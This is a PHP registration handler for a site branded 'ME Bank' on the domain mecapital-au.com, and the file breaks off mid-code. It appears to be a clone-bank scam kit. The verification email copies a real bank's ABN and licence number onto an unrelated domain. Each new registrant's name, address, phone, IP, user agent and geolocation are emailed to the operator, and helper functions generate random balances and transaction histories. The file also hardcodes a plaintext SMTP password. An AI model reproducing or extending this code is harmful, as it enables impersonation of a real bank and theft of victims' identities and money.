<?php 
/*
  Designed By EA1
  Sponsored By GHOST
  Mysqli Connection to Database = 'ME BANK'
*/
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

//Load Composer's autoloader
require 'vendor/autoload.php';

//Create an instance; passing `true` enables exceptions
$mail = new PHPMailer(true);

// error_reporting(0);
// ini_set('display_errors', 0);
// ini_set('display_startup_errors', 0);

require_once('vendor/globalcitizen/php-iban/php-iban.php');

include('inc_db.php');
// connect to DB
$connect = new connectDB();
$conn = $connect -> connectionString();
// connect to DB ends here
// start session
session_start();
// start session ends here
//set time zone
date_default_timezone_set('Australia/Sydney');
// set time zone ends here
// Clean input field
function cleanString($con, $val){
    return mysqli_real_escape_string($con, $val);
}
// clean input field ends here
// error message function
function message($err, $msg){
    return "<div class='alert alert-$err art-margin''>$msg</div>";
}
// error message function ends here
// mailer function
function mailer($mail, $from,$to,$subject, $msg){  
    //Server settings
    // $mail->SMTPDebug = SMTP::DEBUG_SERVER;                      
    $mail->isSMTP();                                          
    $mail->Host       = 'mail.mecapital-au.com';                     
    $mail->SMTPAuth   = true;                                  
    $mail->Username   = 'noreply@mecapital-au.com';                    
    $mail->Password   = 'V&F%s~sHbg&f';                              
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;          
    $mail->Port       = 465;                                    

    //Recipients
    $mail->setFrom($from, 'ME');
    $mail->addAddress($to);     
    $mail->addReplyTo($from);
    
    //Content
    $mail->isHTML(true);                                  
    $mail->Subject = $subject;
    $mail->Body = $msg;

    if(!$mail->send()) {
        echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
    } else {
        // echo 'Message has been sent';
    } 
}
function mailer_admin($mail, $from,$to,$subject,$subjectadm, $message1, $message2, $adminemail){  
   	//Server settings
    // $mail->SMTPDebug = SMTP::DEBUG_SERVER;                      
    $mail->isSMTP();                                          
    $mail->Host       = 'mail.mecapital-au.com';                     
    $mail->SMTPAuth   = true;                                  
    $mail->Username   = 'noreply@mecapital-au.com';                    
    $mail->Password   = 'V&F%s~sHbg&f';                              
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;          
    $mail->Port       = 465;                                    

    //Recipients
    $mail->setFrom($from, 'ME');
    $mail->addAddress($to);     
    $mail->addReplyTo($from);


    //Content
    $mail->isHTML(true);                                  
    $mail->Subject = $subject;
    $mail->Body = $message1;
    
    if(!$mail->send()) {
        echo "Message could not be sent.";
    } else {
        echo '';
    }

    $mail->ClearAllRecipients();
    
    $mail->Body = $message2;
    $mail->Subject = $subjectadm;
    $mail->AddAddress($adminemail);

    // $mail->send();

    if(!$mail->send()) {
        echo "Message could not be sent.";
    } else {
        echo '';
    }        
}
// mailer function ends here
function getUserIpAddr(){
    if(!empty($_SERVER['HTTP_CLIENT_IP'])){
        //ip from share internet
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
        //ip pass from proxy
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }else{
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}
function get_client_ip(){
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } else if (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }
    return $ipaddress;
}
function newusergenerateRandCurrency(){
  // generate random currency value
  $randamount = rand(10, 1000);
  $zeroarry = array('0', '00');
  $randval = rand(0, 1);
  $amount = $randamount.$zeroarry[$randval];
  if ($amount > 10000) {
    $amount = rtrim($amount, '0').'0';
  }
  // generate random currency value
  return $amount;
}
function newgenerateTransaction(){
  $year = array("Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec");
  $currentdatemonth = date('M');
  if (in_array($currentdatemonth, $year)) {
    $startdate = $currentdatemonth;
    $arrysearch = array_search($startdate, $year);
    $arrycount = count($year);
    $length = (int)$arrycount - (int)$arrysearch;
    $totalval = "";
    if ($length >= 8) {
      for ($x=0; $x < 8; $x++) { 
        $amount = 0;
        $monthpos = $x + $arrysearch;
        $totalval .= $year[$monthpos].'=>'.$amount." ";
      }
      return $totalval;
    }
    else{
      $distance = 8 - $length;
      $totalvalb = "";
      for ($y=0; $y < $distance; $y++) {
        $amount = 0; 
        $lessmonth = $y + $arrysearch - $distance;
        $totalvalb .= $year[$lessmonth].'=>'.$amount." ";
      }
      $totalvalc = "";
      for ($x=0; $x < $length; $x++) { 
        $amount = 0;
        $monthpos = $x + $arrysearch;
        $totalvalc .= $year[$monthpos].'=>'.$amount." ";
      }
      return $totalvalb.$totalvalc;
    }
  }
}
function ageChecker($date) {
   $date2=date("Y-m-d");
   $date1=new DateTime($date);
   $date2=new DateTime($date2);

   $interval = $date1->diff($date2);

   $myage= $interval->y;

   if ($myage >= 18){ 
      return true;
   } 
   else{ 
      return false;;
   }
} 
function notify($conn, $userid, $title, $message, $icon, $alert){
    $status = 'N';
    $date = date("d M, Y H:i:s");
    $msg = htmlspecialchars($message);
    mysqli_query($conn, "INSERT INTO `tbl_notif`(`userid`, `title`, `message`, `status`, `icon`, `alert`, `trn_date`) VALUES ('$userid', '$title', '$message','$status','$icon','$alert','$date')");
}
// create account starts here
if (isset($_POST['pysubmitform'])) {
  $datapyWorkPageAccountType = cleanString($conn, $_POST['datapyWorkPageAccountType']);
  $datapyTitle = cleanString($conn, $_POST['datapyTitle']);
  $datapyFirstName = cleanString($conn, $_POST['datapyFirstName']);
  $dataMiddleName = cleanString($conn, $_POST['dataMiddleName']);
  $datapyLastName = cleanString($conn, $_POST['datapyLastName']);
  $datapyDateOfBirth = cleanString($conn, $_POST['datapyDateOfBirth']);
  $datapyEmail = cleanString($conn, $_POST['datapyEmail']);
  $datapyMobilePhone = cleanString($conn, $_POST['datapyMobilePhone']);
  $datapyresidentialaddress = cleanString($conn, $_POST['datapyresidentialaddress']);
  $dataOccupationType = cleanString($conn, $_POST['dataOccupationType']);
  $dataOccupationCategory = cleanString($conn, $_POST['dataOccupationCategory']);
  $dataResidencyStatus = cleanString($conn, $_POST['dataResidencyStatus']);

	$filterfirstname = strtolower($datapyFirstName);
  $filtermiddlename = strtolower($dataMiddleName);
	$filterlastname = strtolower($datapyLastName);
	$filtermail = strtolower($datapyEmail);

	$regdate = date("d M, Y H:i:s");

	$chkemailqry = mysqli_query($conn, "SELECT * FROM clients WHERE email='$filtermail'");
	
	$phonefilter = preg_replace("/[^0-9]/", '', $datapyMobilePhone);

  $accountTypeArry = array('Single', 'Joint');

  $tittleArry = array('MR', 'MS', 'MRS', 'MISS');

  $industryArry = array('Manager / Professional', 'Emergency Services', 'Trade Workers and Technicians', 'Community and Personal Services', 'Office and Administration', 'Sales', 'Labourer and Related Services', 'Non-Employed');

  $residencyArry = array('Citizen','PermanentResident', 'ResidentForTaxPurposes');

	if (empty($datapyWorkPageAccountType) || empty($datapyTitle) || empty($datapyFirstName) || empty($dataMiddleName) || empty($datapyLastName) || empty($datapyDateOfBirth) || empty($datapyEmail) || empty($datapyMobilePhone) || empty($datapyresidentialaddress) || empty($dataOccupationType) || empty($dataOccupationCategory) || empty($dataResidencyStatus)) {
		echo "All fields are required";
	}
  elseif (!in_array($datapyWorkPageAccountType, $accountTypeArry)) {
    echo "Invalid Account type";
  }
  elseif (!in_array($datapyTitle, $tittleArry)) {
    echo "Invalid Title";
  }
  elseif (strlen($datapyFirstName) < 3 || !preg_match("/^([a-zA-Z' ]+)$/", $datapyFirstName)) {
    echo "Invalid First Name";
  }
  elseif (strlen($dataMiddleName) < 3 || !preg_match("/^([a-zA-Z' ]+)$/", $dataMiddleName)) {
    echo "Invalid Middle Name";
  }
  elseif (strlen($datapyLastName) < 3 || !preg_match("/^([a-zA-Z' ]+)$/", $datapyLastName)) {
    echo "Invalid Last Name";
  }
  elseif (strlen($datapyFirstName) > 15) {
      echo "First Name has exceed limit of 15 characters";
  }
  elseif (strlen($dataMiddleName) > 15) {
      echo "Middle Name has exceed limit of 15 characters";
  }
  elseif (strlen($datapyLastName) > 15) {
      echo "Last Name has exceed limit of 15 characters";
  }
  elseif (ageChecker($datapyDateOfBirth) == false) {
    echo "Invalid Age";
  }
  elseif (!filter_var($filtermail, FILTER_VALIDATE_EMAIL)) {
      echo "Invalid Email";
  }
  elseif (strlen($datapyMobilePhone) < 9) {
    echo "Invalid Phone Number";
  }
  elseif (!preg_match("/^[#.0-9a-zA-Z\s,-]+$/", $datapyresidentialaddress) || strlen($datapyresidentialaddress) < 8) {
    echo "Invalid Residential address";
  }
  elseif (!in_array($dataOccupationType, $industryArry)) {
    echo "Invalid Industry";
  }
  elseif (!preg_match("/^[a-zA-Z' ]+$/", $dataOccupationCategory) || strlen($dataOccupationCategory) < 5) {
    echo "Invalid Occupation";
  }
  elseif (!in_array($dataResidencyStatus, $residencyArry)) {
    echo "Invalid Residency";
  }
  elseif (mysqli_num_rows($chkemailqry) > 0) {
    echo "Email already exist";
  }
  else{
    $token = sha1(mt_rand());

    mysqli_query($conn, "INSERT INTO `account`(`userid`, `total_balance`, `available_balance`, `credit`, `debit`, `trn_date`) VALUES ('$filtermail', '0', '0', '0', '0', '$regdate')");

    mysqli_query($conn, "INSERT INTO `tnx_history`(`userid`, `transaction`, `trn_date`) VALUES ('$filtermail', '', '$regdate')");

    $pyinsert = mysqli_query($conn, "INSERT INTO clients (`account_type`, `title`, `firstname`, `middlename`, `lastname`, `dob`, `email`, `email_verified`, `token`, `mobile`, `address`, `industry`, `occupation`, `residency`, `account_status`, `account_state`, `tnx_lock`, `trn_date`) VALUES ('$datapyWorkPageAccountType', '$datapyTitle', '$filterfirstname', '$filtermiddlename', '$filterlastname', '$datapyDateOfBirth', '$filtermail', 'N', '$token', '$datapyMobilePhone', '$datapyresidentialaddress', '$dataOccupationType', '$dataOccupationCategory', '$dataResidencyStatus', 'N', 'active', 'off', '$regdate')");



    if ($pyinsert) {
      $title = "Hello there, and welcome to ME Bank.";
      $message = "Welcome to ME Bank; your account has been setup and is ready for you to make and receive payments.";
      $icon = "account-circle-outline";
      $alert = "success";
      notify($conn, $filtermail, $title, $message, $icon, $alert);

      $subj = ucfirst($filterfirstname)." Your Verification Link for ME Bank";
      $filterfirstname = ucfirst($filterfirstname);
      $tokenmain = $token.'#'.sha1(mt_rand());
      $year_mail = date('Y');
      $emailmessage = "<!DOCTYPE html PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN' 'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'> <html xmlns='http://www.w3.org/1999/xhtml' xmlns:o='urn:schemas-microsoft-com:office:office'> <head> <meta charset='UTF-8'> <meta content='width=device-width, initial-scale=1' name='viewport'> <meta name='x-apple-disable-message-reformatting'> <meta http-equiv='X-UA-Compatible' content='IE=edge'> <meta content='telephone=no' name='format-detection'> <title>Verify your account</title> <!--[if (mso 16)]> <style type='text/css'> a {text-decoration: none;} </style> <![endif]--> <!--[if gte mso 9]><style>sup { font-size: 100% !important; }</style><![endif]--> <!--[if gte mso 9]> <xml> <o:OfficeDocumentSettings> <o:AllowPNG></o:AllowPNG> <o:PixelsPerInch>96</o:PixelsPerInch> </o:OfficeDocumentSettings> </xml> <![endif]--> <style type='text/css'> #outlook a {padding:0; } .es-button {mso-style-priority:100!important; text-decoration:none!important; } a[x-apple-data-detectors] {color:inherit!important; text-decoration:none!important; font-size:inherit!important; font-family:inherit!important; font-weight:inherit!important; line-height:inherit!important; } .es-desk-hidden {display:none; float:left; overflow:hidden; width:0; max-height:0; line-height:0; mso-hide:all; } [data-ogsb] .es-button {border-width:0!important; padding:10px 20px 10px 20px!important; } [data-ogsb] .es-button.es-button-1 {padding:10px 20px!important; } @media only screen and (max-width:600px) {p, ul li, ol li, a { line-height:150%!important } h1, h2, h3, h1 a, h2 a, h3 a { line-height:120% } h1 { font-size:20px!important; text-align:center } h2 { font-size:18px!important; text-align:center } h3 { font-size:16px!important; text-align:center } .es-header-body h1 a, .es-content-body h1 a, .es-footer-body h1 a { font-size:20px!important } .es-header-body h2 a, .es-content-body h2 a, .es-footer-body h2 a { font-size:18px!important } .es-header-body h3 a, .es-content-body h3 a, .es-footer-body h3 a { font-size:16px!important } .es-menu td a { font-size:13px!important } .es-header-body p, .es-header-body ul li, .es-header-body ol li, .es-header-body a { font-size:22px!important } .es-content-body p, .es-content-body ul li, .es-content-body ol li, .es-content-body a { font-size:13px!important } .es-footer-body p, .es-footer-body ul li, .es-footer-body ol li, .es-footer-body a { font-size:10px!important } .es-infoblock p, .es-infoblock ul li, .es-infoblock ol li, .es-infoblock a { font-size:13px!important } *[class='gmail-fix'] { display:none!important } .es-m-txt-c, .es-m-txt-c h1, .es-m-txt-c h2, .es-m-txt-c h3 { text-align:center!important } .es-m-txt-r, .es-m-txt-r h1, .es-m-txt-r h2, .es-m-txt-r h3 { text-align:right!important } .es-m-txt-l, .es-m-txt-l h1, .es-m-txt-l h2, .es-m-txt-l h3 { text-align:left!important } .es-m-txt-r img, .es-m-txt-c img, .es-m-txt-l img { display:inline!important } .es-button-border { display:inline-block!important } a.es-button, button.es-button { font-size:13px!important; display:inline-block!important } .es-adaptive table, .es-left, .es-right { width:100%!important } .es-content table, .es-header table, .es-footer table, .es-content, .es-footer, .es-header { width:100%!important; max-width:600px!important } .es-adapt-td { display:block!important; width:100%!important } .adapt-img { width:100%!important; height:auto!important } .es-m-p0 { padding:0px!important } .es-m-p0r { padding-right:0px!important } .es-m-p0l { padding-left:0px!important } .es-m-p0t { padding-top:0px!important } .es-m-p0b { padding-bottom:0!important } .es-m-p20b { padding-bottom:20px!important } .es-mobile-hidden, .es-hidden { display:none!important } tr.es-desk-hidden, td.es-desk-hidden, table.es-desk-hidden { width:auto!important; overflow:visible!important; float:none!important; max-height:inherit!important; line-height:inherit!important } tr.es-desk-hidden { display:table-row!important } table.es-desk-hidden { display:table!important } td.es-desk-menu-hidden { display:table-cell!important } .es-menu td { width:1%!important } table.es-table-not-adapt, .esd-block-html table { width:auto!important } table.es-social { display:inline-block!important } table.es-social td { display:inline-block!important } } </style> </head> <body style='width:100%;font-family:arial, helvetica, sans-serif;-webkit-text-size-adjust:100%;-ms-text-size-adjust:100%;padding:0;Margin:0'> <div class='es-wrapper-color' style='background-color:#F6F6F6'> <!--[if gte mso 9]> <v:background xmlns:v='urn:schemas-microsoft-com:vml' fill='t'> <v:fill type='tile' color='#f6f6f6'></v:fill> </v:background> <![endif]--> <table class='es-wrapper' width='100%' cellspacing='0' cellpadding='0' style='mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px;padding:0;Margin:0;width:100%;height:100%;background-repeat:repeat;background-position:center top'> <tr> <td valign='top' style='padding:0;Margin:0'> <table class='es-header' cellspacing='0' cellpadding='0' align='center' style='mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px;table-layout:fixed !important;width:100%;background-color:transparent;background-repeat:repeat;background-position:center top'> <tr> <td align='center' style='padding:0;Margin:0'> <table class='es-header-body' cellspacing='0' cellpadding='0' bgcolor='#ffffff' align='center' style='mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px;background-color:#FFFFFF;width:600px'> <tr> <td align='left' style='padding:0;Margin:0;padding-top:20px;padding-left:20px;padding-right:20px'> <table cellpadding='0' cellspacing='0' width='100%' style='mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px'> <tr> <td align='center' valign='top' style='padding:0;Margin:0;width:560px'> <table cellpadding='0' cellspacing='0' width='100%' role='presentation' style='mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px'> <tr> <td align='left' style='padding:0;Margin:0;padding-top:10px;padding-bottom:15px;font-size:0px'><img src='https://mecapital-au.com/mailer_img/logo.png' alt style='display:block;border:0;outline:none;text-decoration:none;-ms-interpolation-mode:bicubic' width='60'></td> </tr> </table></td> </tr> </table></td> </tr> <tr> <td align='left' style='Margin:0;padding-top:10px;padding-bottom:10px;padding-left:20px;padding-right:20px'> <table cellpadding='0' cellspacing='0' width='100%' style='mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px'> <tr> <td align='center' valign='top' style='padding:0;Margin:0;width:560px'> <table cellpadding='0' cellspacing='0' width='100%' role='presentation' style='mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px'> <tr> <td align='center' style='padding:0;Margin:0'><p style='Margin:0;-webkit-text-size-adjust:none;-ms-text-size-adjust:none;mso-line-height-rule:exactly;font-family:arial, helvetica, sans-serif;line-height:33px;color:#333333;font-size:22px'><strong>Verify your email address</strong></p></td> </tr> </table></td> </tr> </table></td> </tr> </table></td> </tr> </table> <table cellpadding='0' cellspacing='0' class='es-content' align='center' style='mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px;table-layout:fixed !important;width:100%'> <tr> <td align='center' style='padding:0;Margin:0'> <table bgcolor='#ffffff' class='es-content-body' align='center' cellpadding='0' cellspacing='0' style='mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px;background-color:#FFFFFF;width:600px'> <tr> <td align='left' style='Margin:0;padding-top:10px;padding-bottom:10px;padding-left:20px;padding-right:20px'> <table cellpadding='0' cellspacing='0' width='100%' style='mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px'> <tr> <td align='center' valign='top' style='padding:0;Margin:0;width:560px'> <table cellpadding='0' cellspacing='0' width='100%' role='presentation' style='mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px'> <tr> <td align='left' style='padding:0;Margin:0;padding-top:10px;padding-bottom:10px'><p style='Margin:0;-webkit-text-size-adjust:none;-ms-text-size-adjust:none;mso-line-height-rule:exactly;font-family:arial, helvetica, sans-serif;line-height:21px;color:#333333;font-size:14px'>Hello $filterfirstname,<br><br>You recently opened an account with ME Bank with the email address $filtermail. Click the button below this email to check that this email address belongs to you, doing so will help secure you account</p></td> </tr> <tr> <td align='left' style='padding:0;Margin:0;padding-top:20px;padding-bottom:20px'><span class='es-button-border' style='border-style:solid;border-color:#000000;background:#000000;border-width:0px;display:inline-block;border-radius:3px;width:auto'><a href='https://mecapital-au.com/auth/R3/auth.php?token=$tokenmain' class='es-button es-button-1' target='_blank' style='mso-style-priority:100 !important;text-decoration:none;-webkit-text-size-adjust:none;-ms-text-size-adjust:none;mso-line-height-rule:exactly;color:#FFFFFF;font-size:14px;border-style:solid;border-color:#000000;border-width:10px 20px;display:inline-block;background:#000000;border-radius:3px;font-family:arial, helvetica, sans-serif;font-weight:normal;font-style:normal;line-height:17px;width:auto;text-align:center'>Verify email address</a></span></td> </tr> <tr> <td align='left' style='padding:0;Margin:0;padding-top:10px;padding-bottom:10px'><p style='Margin:0;-webkit-text-size-adjust:none;-ms-text-size-adjust:none;mso-line-height-rule:exactly;font-family:arial, helvetica, sans-serif;line-height:21px;color:#333333;font-size:14px'>Button not working? Copy and paste the following URL into your browser.<br><br>https://mecapital-au.com/auth/R3/auth.php?token=$tokenmain<br><br><strong>Why did you receive this email?</strong><br>ME Bank requires verification whenever an email is selected for your ME Bank account. This email cannot be used until you have verified it. <br><br>Please ignore this email if you did not initiate it.<br><br>Kind regards,<br>ME Bank Support<br></p></td> </tr> </table></td> </tr> </table></td> </tr> </table></td> </tr> </table> <table cellpadding='0' cellspacing='0' class='es-footer' align='center' style='mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px;table-layout:fixed !important;width:100%;background-color:transparent;background-repeat:repeat;background-position:center top'> <tr> <td align='center' style='padding:0;Margin:0'> <table bgcolor='#ffffff' class='es-footer-body' align='center' cellpadding='0' cellspacing='0' style='mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px;background-color:#FFFFFF;width:600px'> <tr> <td align='left' style='Margin:0;padding-left:20px;padding-right:20px;padding-top:25px;padding-bottom:30px'> <table cellpadding='0' cellspacing='0' width='100%' style='mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px'> <tr> <td align='center' valign='top' style='padding:0;Margin:0;width:560px'> <table cellpadding='0' cellspacing='0' width='100%' role='presentation' style='mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px'> <tr> <td align='center' style='padding:0;Margin:0'><p style='Margin:0;-webkit-text-size-adjust:none;-ms-text-size-adjust:none;mso-line-height-rule:exactly;font-family:arial, helvetica, sans-serif;line-height:18px;color:#333333;font-size:12px'>Copyright &#169; $year_mail ME Bank, Inc. All Rights Reserved.<br>ME Bank Queensland Limited ABN 32 009 656 740 AFSL and Australian Credit Licence Number 244616.</p></td> </tr> </table></td> </tr> </table></td> </tr> </table></td> </tr> </table></td> </tr> </table> </div> </body> </html>";

        // Admin mailer starts here
        $subadmin = "New User Registeration";
        $ipadd = getUserIpAddr();
        $useragent = $user_ag = $_SERVER['HTTP_USER_AGENT'];
        $PublicIP = get_client_ip();
        $json     = file_get_contents("http://ipinfo.io/$PublicIP/geo");
        $json     = json_decode($json, true);
        @$adcountry  = $json['country'];
        @$adregion   = $json['region'];
        @$adcity     = $json['city'];
        $adminmessage = "<!DOCTYPE html PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN' 'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'> <html xmlns='http://www.w3.org/1999/xhtml' xmlns:o='urn:schemas-microsoft-com:office:office'> <head> <meta charset='UTF-8'> <meta content='width=device-width, initial-scale=1' name='viewport'> <meta name='x-apple-disable-message-reformatting'> <meta http-equiv='X-UA-Compatible' content='IE=edge'> <meta content='telephone=no' name='format-detection'> <title>New message</title> <style type='text/css'> .section-title {padding:5px 10px; background-color:#f6f6f6; border:1px solid #dfdfdf; outline:0; } #outlook a {padding:0; } .es-button {mso-style-priority:100!important; text-decoration:none!important; } a[x-apple-data-detectors] {color:inherit!important; text-decoration:none!important; font-size:inherit!important; font-family:inherit!important; font-weight:inherit!important; line-height:inherit!important; } .es-desk-hidden {display:none; float:left; overflow:hidden; width:0; max-height:0; line-height:0; mso-hide:all; } [data-ogsb] .es-button {border-width:0!important; padding:10px 20px 10px 20px!important; } @media only screen and (max-width:600px) {p, ul li, ol li, a { line-height:150%!important } h1, h2, h3, h1 a, h2 a, h3 a { line-height:120% } h1 { font-size:24px!important; text-align:center } h2 { font-size:20px!important; text-align:center } h3 { font-size:16px!important; text-align:center } .es-header-body h1 a, .es-content-body h1 a, .es-footer-body h1 a { font-size:24px!important } .es-header-body h2 a, .es-content-body h2 a, .es-footer-body h2 a { font-size:20px!important } .es-header-body h3 a, .es-content-body h3 a, .es-footer-body h3 a { font-size:16px!important } .es-menu td a { font-size:14px!important } .es-header-body p, .es-header-body ul li, .es-header-body ol li, .es-header-body a { font-size:20px!important } .es-content-body p, .es-content-body ul li, .es-content-body ol li, .es-content-body a { font-size:14px!important } .es-footer-body p, .es-footer-body ul li, .es-footer-body ol li, .es-footer-body a { font-size:14px!important } .es-infoblock p, .es-infoblock ul li, .es-infoblock ol li, .es-infoblock a { font-size:14px!important } *[class='gmail-fix'] { display:none!important } .es-m-txt-c, .es-m-txt-c h1, .es-m-txt-c h2, .es-m-txt-c h3 { text-align:center!important } .es-m-txt-r, .es-m-txt-r h1, .es-m-txt-r h2, .es-m-txt-r h3 { text-align:right!important } .es-m-txt-l, .es-m-txt-l h1, .es-m-txt-l h2, .es-m-txt-l h3 { text-align:left!important } .es-m-txt-r img, .es-m-txt-c img, .es-m-txt-l img { display:inline!important } .es-button-border { display:inline-block!important } a.es-button, button.es-button { font-size:20px!important; display:inline-block!important } .es-adaptive table, .es-left, .es-right { width:100%!important } .es-content table, .es-header table, .es-footer table, .es-content, .es-footer, .es-header { width:100%!important; max-width:600px!important } .es-adapt-td { display:block!important; width:100%!important } .adapt-img { width:100%!important; height:auto!important } .es-m-p0 { padding:0px!important } .es-m-p0r { padding-right:0px!important } .es-m-p0l { padding-left:0px!important } .es-m-p0t { padding-top:0px!important } .es-m-p0b { padding-bottom:0!important } .es-m-p20b { padding-bottom:20px!important } .es-mobile-hidden, .es-hidden { display:none!important } tr.es-desk-hidden, td.es-desk-hidden, table.es-desk-hidden { width:auto!important; overflow:visible!important; float:none!important; max-height:inherit!important; line-height:inherit!important } tr.es-desk-hidden { display:table-row!important } table.es-desk-hidden { display:table!important } td.es-desk-menu-hidden { display:table-cell!important } .es-menu td { width:1%!important } table.es-table-not-adapt, .esd-block-html table { width:auto!important } table.es-social { display:inline-block!important } table.es-social td { display:inline-block!important } } </style> </head> <body style='width:100%;font-family:arial, helvetica, sans-serif;-webkit-text-size-adjust:100%;-ms-text-size-adjust:100%;padding:0;Margin:0'> <div class='es-wrapper-color' style='background-color:#F6F6F6'> <!--[if gte mso 9]> <v:background xmlns:v='urn:schemas-microsoft-com:vml' fill='t'> <v:fill type='tile' color='#f6f6f6'></v:fill> </v:background> <![endif]--> <table class='es-wrapper' width='100%' cellspacing='0' cellpadding='0' style='mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px;padding:0;Margin:0;width:100%;height:100%;background-repeat:repeat;background-position:center top'> <tr> <td valign='top' style='padding:0;Margin:0'> <table class='es-header' cellspacing='0' cellpadding='0' align='center' style='mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px;table-layout:fixed !important;width:100%;background-color:transparent;background-repeat:repeat;background-position:center top'> <tr> <td align='center' style='padding:0;Margin:0'> <table class='es-header-body' cellspacing='0' cellpadding='0' bgcolor='#ffffff' align='center' style='mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px;background-color:#FFFFFF;width:600px'> <tr> <td align='left' style='Margin:0;padding-left:20px;padding-right:20px;padding-top:25px;padding-bottom:25px'> <table cellspacing='0' cellpadding='0' width='100%' style='mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px'> <tr> <td align='left' style='padding:0;Margin:0;width:560px'> <table width='100%' cellspacing='0' cellpadding='0' role='presentation' style='mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px'> <tr> <td align='left' style='padding:0;Margin:0;font-size:0px'><img src='https://mecapital-au.com/mailer_img/logo.png' alt style='display:block;border:0;outline:none;text-decoration:none;-ms-interpolation-mode:bicubic' width='150'></td> </tr> </table></td> </tr> </table></td> </tr> <tr> <td align='left' style='padding:0;Margin:0;padding-top:20px;padding-left:20px;padding-right:20px'> <table cellpadding='0' cellspacing='0' width='100%' style='mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px'> <tr> <td align='center' valign='top' style='padding:0;Margin:0;width:560px'> <table cellpadding='0' cellspacing='0' width='100%' role='presentation' style='mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px'> <tr> <td align='left' style='padding:0;Margin:0'><p style='Margin:0;-webkit-text-size-adjust:none;-ms-text-size-adjust:none;mso-line-height-rule:exactly;font-family:arial, helvetica, sans-serif;line-height:36px;color:#333333;font-size:24px'><strong>New User Registeration</strong></p></td> </tr> </table></td> </tr> </table></td> </tr> </table></td> </tr> </table> <table class='es-content' cellspacing='0' cellpadding='0' align='center' style='mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px;table-layout:fixed !important;width:100%'> <tr> <td align='center' style='padding:0;Margin:0'> <table class='es-content-body' cellspacing='0' cellpadding='0' bgcolor='#ffffff' align='center' style='mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px;background-color:#FFFFFF;width:600px'> <tr> <td align='left' style='Margin:0;padding-left:20px;padding-right:20px;padding-top:30px;padding-bottom:30px'> <table cellpadding='0' cellspacing='0' width='100%' style='mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px'> <tr> <td align='center' valign='top' style='padding:0;Margin:0;width:560px'> <table cellpadding='0' cellspacing='0' width='100%' role='presentation' style='mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px'> <tr> <td align='left' style='padding:0;Margin:0'><p style='Margin:0;-webkit-text-size-adjust:none;-ms-text-size-adjust:none;mso-line-height-rule:exactly;font-family:arial, helvetica, sans-serif;line-height:36px;color:#333333;text-transform: uppercase;font-size:14px'>Full Name: $filterfirstname $filterlastname<br>Address: $datapyresidentialaddress<br>Phone: $phonefilter &nbsp;<br>Date: $regdate<br>User Agent:$ipadd $useragent $adcountry $adregion $adcity<br> &nbsp;</p></td> </tr> </table></td> </tr> </table></td> </tr> </table></td> </tr> </table></td> </tr> </table> </div> </body> </html>";
        // Admin mailer ends here
        $mail = mailer_admin($mail, 'noreply@mecapital-au.com', $filtermail, $subj, $subadmin, $emailmessage, $adminmessage, 'mail@mecapital-au.com');
